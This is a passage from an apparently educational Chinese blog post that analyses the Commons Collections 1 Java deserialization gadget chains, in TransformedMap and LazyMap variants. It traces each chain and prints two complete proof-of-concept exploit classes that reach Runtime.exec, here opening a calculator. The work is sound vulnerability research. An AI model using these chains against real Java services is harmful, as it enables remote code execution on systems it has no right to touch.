class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们最想要的是，transform方法最好也要自动触发，所以发现了checkSetValue方法，它会自动调用transform方法。</p><p>checkSetValue方法属于每一个继承了AbstractInputCheckedMapDecorator的类，TransformedMap算一个。</p><p>所以接下来我们的目标就变成了<strong>如何让TransformedMap自动调用transform方法</strong>。</p><p><strong>我们的ChainedTransformer说到底就是一个Transformer，只要添加数据至map中就会自动调用tramsform，就会执行转换链执行payload。</strong></p><p>这样我们就可以把触发条件从显性的调用<strong>转换链的transform函数</strong>延伸到<strong>修改map的值</strong>。<strong>很明显后者是一个常规操作，极有可能被触发。</strong></p><p>举个例子获得一个TransformedMap的实例，可以通过TransformedMap.decorate()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map tansformedMap = TransformedMap.decorate(map, keyTransformer, valueTransformer);</span><br></pre></td></tr></table></figure><p>可以看到三个参数，map，keyTransformer，valueTransformer。</p><p>查看org.apache.commons.collections.map.TransformedMap#decorate源码：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512170116032.png" alt="image-20210512170116032"></p><p>到这里，触发条件就是更改map的值(key或者value)即可。</p><h4 id="寻找readObject复写点"><a href="#寻找readObject复写点" class="headerlink" title="寻找readObject复写点"></a>寻找readObject复写点</h4><p>感觉还是奇怪，需要服务端配合将反序列化内容反序列化为map，并对值进行修改。</p><p>如果某个可序列化的类重写了<code>readObject()</code>方法，并且在<code>readObject()</code>中对Map类型的变量进行了key-value修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。</p><p>在1.7中存在一个完美的复写点：<strong>sun.reflect.annotation.AnnotationInvocationHandler</strong></p><p>关于AnnotationInvocationHandler类，这个类本身是被设计用来处理Java注解的。</p><p>看两处源码关键点：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512171701564.png" alt="image-20210512171701564"></p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512172608629.png" alt="image-20210512172608629" style="zoom:95%;"><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p><strong>为什么要传入Target.class?</strong></p><p>Target是Java提供的四个元注解之一(Target，Documented，Inherited)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type)</span><br></pre></td></tr></table></figure><p>我们回来看<code>AnnotationType.getInstance(this.type)</code>对@Target这个注解的处理。var2=getInstance会获取到@Target的基本信息，包括注解元素，注解元素的默认值，生命周期，是否继承等等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var3 = var2.memberTypes();</span><br></pre></td></tr></table></figure><p>var3就是var2的键值对类型，可以取值<code>Ljava.lang.annotation.ElementType</code>类型的值。</p><p>这里其实占了Java注解的语法糖的便宜，Java注解默认都是value = XXXX，相当于蹭了个谐音梗。</p><p><strong>为什么一定要Map(“value”, “value”)?</strong></p><p>因为在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map var3 = var2.memberTypes();<span class="comment">//var3 = &#123;value：ElementType&#125;</span></span><br></pre></td></tr></table></figure><p>这就保证了在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Map var3 = var2.memberTypes();<span class="comment">// var3 = &#123;value：ElementType&#125;</span></span><br><span class="line">Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator(); <span class="comment">// var4 是迭代器</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">  Entry var5 = (Entry)var4.next();<span class="comment">//var5 = &#123;value:value&#125;</span></span><br><span class="line">  String var6 = (String)var5.getKey();<span class="comment">// var6 = value</span></span><br><span class="line">  Class var7 = (Class)var3.get(var6); <span class="comment">//ElementType</span></span><br><span class="line">  <span class="comment">//从@Target的注解元素键值对&#123;value：ElementType的键值对&#125;中去寻找键名为key的值</span></span><br><span class="line">  <span class="comment">//如果key的值不是value，那么这里就null，链就断掉了</span></span><br><span class="line">  <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">//触发命令执行处</span></span><br><span class="line">    var5.setValue...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>保证<code>innerMap.put(&quot;value&quot;,&quot;xxxxxx&quot;)</code>也是可以的，只要key的值为”value“就行。</strong></p><h4 id="su18师傅斧正"><a href="#su18师傅斧正" class="headerlink" title="su18师傅斧正"></a>su18师傅斧正</h4><p>su18师傅纠正我，其实这里并不一定是Target.class。。。</p><p>比如这里换成另一种注解：Generated.class</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210719193602502.png" alt="image-20210719193602502" style="zoom:50%;"><p>我们选最下面这个字段“comments”，那这个版本就是：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210719193907555.png" alt="image-20210719193907555" style="zoom:50%;"><p>debug跟一下：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210719194130981.png" alt="image-20210719194130981"></p><p>这里和之前一样，var3是map，var4是迭代器，我们的终极目标是执行<code>setValue</code></p><p>var5就是entry，var6就是key（String类型），var7就是var3中var6对应的value，是String.class这个类对象。</p><p>var8是entry中的value，如果我们要执行<code>setValue</code>，就必须让<code>var7.isInstance(var8)==false</code></p><p>也就是说：</p><p><strong>var8不能是String类型</strong>，所以这里HashMap的value不能再是“value”了，比如可以改成3，int类型就是可以的。</p><h4 id="最终版本PoC"><a href="#最终版本PoC" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h4><p>最终版本PoC构造如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1_TransformedMap_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChian</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">        Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_transformedMap.ser"</span>)));</span><br><span class="line">        fout.writeObject(instance);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_transformedMap.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>挖掘流程：</p><ol><li>找readObejct复写点，发现了TransformedMap实现了，进去看一看，留个心</li><li>阅读文档，发现TransformedMap机制是一旦该Map中的元素发生了变化，都会调用Transformer的transform方法</li><li>发现Transformer的transform就是个接口中的方法</li><li>依次查看Transformer的实现类，发现ChainedTransformer中的transform会成环调用自身Transformer数组中的Transformer</li><li>[支线任务开启]寻找invoke调用2点，发现InvokerTransformer内部的transform方法符合反射调用，有可控潜力</li><li>为了符合exp的构造条件，发现ConstantTransformer可以参与</li><li>将一句话分别由多个Transformer来hold，形成了ChainedTransformer，为了让ChainedTransformer.transform可以自动化调用，下一步需要去找哪里用了transform方法</li><li>查看transform的调用，发现TransformedMap类中有checkSetValue方法调用了transform方法</li><li>同时发现checkSetValue是抽象类AbstractInputCheckedMapDecorator的方法，同时该类内部静态类MapEntry的setValue方法调用了checkSetValue方法</li><li>实现AbstractInputCheckedMapDecorator的类有四个，TransformedMap算一个。所以TransformedMap1既是readObject复写点，又是执行链的起点(更改map中的值)[支线任务结束]</li><li>如何来自动更改值，还是去找readObejct复写点，发现AnnotationInvocationHandler十分合适，既复写了readObject，又修改了map的值，可以包装到最外面</li><li>编写Exp</li></ol><p><strong>Exp利用流程</strong>：</p><ol><li>AnnotationInvocationHandler#readObject函数会在反序列化中被执行，并且会触发TransformedMap$EntrySet的setValue赋值。</li><li>EntrySet的构造函数是Set和AbstractInputCheckedMapDecorator类型。</li><li>由于TransformedMap继承了AbstractInputCheckedMapDecorator类，也就继承了AbstractInputCheckedMapDecorator内部的setValue方法。</li><li>setValue就是AbstractInputCheckedMapDecorator.MapEntry#setValue，他的内部会调用checkSetValue方法。</li><li>这里面的map是TransformedMap，所以TransformedMap版本的checkSetValue会调用transform方法，这个transform会调用TransformedMap自身的ConstantTransformer数组，循环调用。这个ConstantTransformer是通过decorate函数将ConstantTransformer配置进去的，最终payload执行。</li></ol><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513192345876.png" alt="image-20210513192345876"></p><p>这里值得细细地跟一下，TransformedMap并不是Map</p><p>this.memberValues = [TransformedMap outMap] = (&lt;”value”,”value”&gt;，chain)</p><p>TransformedMap自己没有entrySet，所以会执行距离它最近的父类的entrySet方法。</p><p>也就是AbstractInputCheckedMapDecorator的entrySet方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513202149561.png" alt="image-20210513202149561"></p><p>这里map的值为HashMap&lt;”value”,”value”&gt;，this是本类对象 TransformedMap outMap</p><p>调用的是本类内部类EntrySet的构造函数</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513203152290.png" alt="image-20210513203152290"></p><p>所以这个Entry函数ruturn回去就是一个AbstractInputCheckedMapDecorator$EntrySet的对象，结构是(注意他们的类别)：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513205357509.png" alt="image-20210513205357509"></p><p>&lt;&lt;”value”,”value”&gt;,outMap&gt;就是var5</p><p>接下来会执行iterator方法，这个方法AbstractInputCheckedMapDecorator#EntrySet也做了实现：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513205526861.png" alt="image-20210513205526861"></p><p>可以看出，实现了对collection的迭代器和parent的操作</p><p>跟进去看EntrySetIterator的实现：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513205918283.png" alt="image-20210513205918283"></p><p>返回一个迭代器就是var4，是。</p><p>接下来，var5=var4.next()</p><p>跟进去next方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513210302272.png" alt="image-20210513210302272"></p><p>好家伙，直接返回了一个MapEntry,entry是entry，parent一直都是TransformedMap outMap</p><p>这下终于理清了，是cc直接搞得鬼。</p><p>var5就是AbstractInputCheckedMapDecorator$MapEntry类</p><p>接下来之后对var5进行setValue调用，由于var5是AbstractInputCheckedMapDecorator$MapEntry对象，所以会执行自己的setValue方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513210604593.png" alt="image-20210513210604593"></p><p>由于这里parent一直是TransformedMap对象outMap，所以调用的是TransformedMap的checkSetValue方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513210818971.png" alt="image-20210513210818971"></p><p>可以看到，这时候outMap一直帮我们存着的chain原来放在了valueTransformer的属性里，也就自然会被执行了。</p><p>接下来就是熟悉的情节了：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513211012291.png" alt="image-20210513211012291"></p><p>触发。</p><h3 id="LazyMap版本"><a href="#LazyMap版本" class="headerlink" title="LazyMap版本"></a>LazyMap版本</h3><p>LazyMap也调用了transform方法。</p><h4 id="利用链寻找-1"><a href="#利用链寻找-1" class="headerlink" title="利用链寻找"></a>利用链寻找</h4><p>对Transformer接口中的transform方法find usage：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513111502143.png" alt="image-20210513111502143"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513111521568.png" alt="image-20210513111521568"></p><p>get方法首先判断map中是否已有该key，如果不存在，最终会到factory.transform进行处理。</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513111833377.png" alt="image-20210513111833377" style="zoom:80%;"><p>能发现decorate方法可以new一个LazyMap方法，如果factory可控，就很有搞头了。</p><p>接下来要找找哪些方法会调用LazyMap的get方法(最好是readObject内部会用到，最契合的条件，可惜没有)</p><p>坑点记录：<a href="https://0range228.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/">记一次对线rt.jar</a></p><p>发现AnnotationInvocationHandler内部的invoke调用了get方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513153931088.png" alt="image-20210513153931088"></p><p>我们可以发现在这个类中，memberValues是Map对象，并且有对map的get操作。</p><p>LazyMap也是Map的子类，重写了get方法，所以这里如果memberValues是LazyMap类对象，会成功调用LazyMap的get方法，就可以触发漏洞。</p><p>所以如何触发这个invoke函数呢？</p><h4 id="PoC构造"><a href="#PoC构造" class="headerlink" title="PoC构造"></a>PoC构造</h4><p>需要依赖动态代理，参考<a href="https://0range228.github.io/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E9%82%A3%E7%82%B9%E4%BA%8B/">之前的博客</a>：</p><p><strong>总结就是被动态代理的对象调用任意方法都会调用对应的InvocationHandler的invoke方法。</strong></p><p>写个小例子好理解：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513160306511.png" alt="image-20210513160306511"></p><p>目前已有条件：</p><ul><li>AnnotationInvocationHandler的readObject方法可以触发setValue，</li><li>cc里面很多Map的setValue方法可以调用transform方法</li><li>LazyMap的invoke可以调用Map.get方法，LazyMap重写的get方法可以触发transform方法</li><li>ChainedTransformer的transform方法可以将里面InvokerTransformer的内容进行成环invoke触发</li></ul><p>这个感觉就像：</p><p>handler是一个InvocationHandler类对象，他内部有invoke方法</p><p>我们可以做一个代理类a，让这个代理类代理LazyMap对象,handler也参与，负责invoke</p><p>这样的话，无论以后a调用了LazyMap内部的任何方法，他都会先走一遍handler的invoke方法。</p><p>注意最后一句话，我们想让”他都会先走一遍handler的invoke方法”，handler的<strong>invoke方法</strong>，<strong>就是LazyMap的invoke方法</strong>。</p><p>抱着这个目标，我们还可以发现:</p><ul><li>AnnotationInvocationHandler继承了InvocationHandler，它也可以当动态代理，也可以作为handler</li></ul><p>所以我们可以：</p><ul><li>先拿到AnnotationInvocationHandler的构造函数cons</li><li>先用cons做一个AnnotationInvocationHandler的实例h1，h1的memberValues属性是一个LazyMap(包装好innermap和chain)</li><li>再用h1参与Proxy.newProxyInstance，去做一个LazyMap的代理实例mapProxy</li><li>再用cons去做一个AnnotationInvocationHandler的实例h2，h2的memberValues属性是mapProxy</li></ul><p>这时候h2作为payload，参与序列化操作。</p><p>我们主要关注反序列化：</p><p>断点下到第一个readObject位置，java.io.ObjectInputStream#readSerialData：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513170527485.png" alt="image-20210513170527485"></p><p>slots数组里面的内容就是h2，可以看到类型是AnnotationInvocationHandler</p><p>接下来会走到java.io.ObjectInputStream#invoke方法，可以看到ma=readObject，obj=h2</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513171248714.png" alt="image-20210513171248714"></p><p>先在AnnotationInvocationHandler.readObject下断点，然后over-step:</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513171910871.png" alt="image-20210513171910871"></p><p>果然进入到readObject方法，理论上现在this.memberValues就是我们传进来的mapProxy参数。</p><p>mapProxy是一个动态代理，它代理了LazyMap这个类，handler是h1。</p><p>那么这里一但mapProxy调用了任何方法，都会走handler(h1)的invoke方法，<strong>this.memberValues.entrySet()就是一次调用</strong></p><p>这里可以先在AnnotationInvocationHandler类的invoke处下一个断点，然后step-over：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513182135950.png" alt="image-20210513182135950"></p><p>这里继续往下看，发现AnnotationInvocationHandler类的invoke调用了this.memberValues.get()：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513182402111.png" alt="image-20210513182402111"></p><p>这会再一次触发h1的invoke函数，并且现在this.memberValues的值为h1的参数，类型是LazyMap，factory就是lazymap属性，就是我们传进去的chain，的那么就会进入LazyMap.get方法：</p><p>LazyMap.get内部就会有transform方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513183528337.png" alt="image-20210513183528337"></p><p>如果当前factory是我们的chain，那就会触发RCE。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject() -&gt; </span><br><span class="line">  AnnotationInvocationHandler.readObject() -&gt; </span><br><span class="line">  <span class="keyword">this</span>.memberValues.entrySet() = mapProxy.entrySet() -&gt;</span><br><span class="line">  AnnotationInvocationHandler.invoke() -&gt; </span><br><span class="line">  <span class="keyword">this</span>.memberValues.get(xx) = LazyMap.get(not_exist_key) -&gt; </span><br><span class="line">  ChainedTransformer.transform() -&gt; InvokerTransfomer.transform() -&gt; </span><br><span class="line">  RCE</span><br></pre></td></tr></table></figure><h4 id="最终版本PoC-1"><a href="#最终版本PoC-1" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1_LazyMap_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>,<span class="string">"abcd"</span>);</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建携带着LazyMap的AnnotationInvocationHandler实例h1</span></span><br><span class="line">        InvocationHandler h1 = (InvocationHandler) cons.newInstance(Target<span class="class">.<span class="keyword">class</span>,<span class="title">lazyMap</span>)</span>;</span><br><span class="line">        <span class="comment">// 创建LazyMap的动态代理类实例</span></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(),<span class="title">LazyMap</span>.<span class="title">class</span>.<span class="title">getInterfaces</span>(), <span class="title">h1</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues</span></span><br><span class="line">        InvocationHandler h2 = (InvocationHandler)cons.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">mapProxy</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_LazyMap.ser"</span>)));</span><br><span class="line">        fout.writeObject(h2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_LazyMap.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="cc2"><a href="#cc2" class="headerlink" title="cc2"></a>cc2</h2><p>条件：</p><ul><li><strong>commons-collections4: 4.0</strong></li><li>jdk1.7 1.8低版本</li></ul><p>maven：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 